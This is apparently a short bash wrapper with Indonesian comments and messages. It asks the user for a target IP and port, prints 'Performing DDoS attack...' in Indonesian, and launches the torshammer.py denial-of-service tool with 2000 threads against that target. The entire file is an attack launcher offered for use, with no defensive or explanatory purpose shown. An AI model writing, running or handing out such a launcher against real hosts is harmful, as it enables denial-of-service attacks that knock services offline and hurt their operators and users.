#!/bin/bash
# warna
b="\033[34;1m"
m="\033[31;1m"

clear
python2 banner.py
echo -e $b" IP Target "$m
read -p " ➢ " t
echo -e $b" LPORT  "$m
read -p " ➢ " p
echo ""
clear
echo "Sedang melakukan Ddos Attack..."
python2 torshammer.py -t $t -r 2000 -p $p;
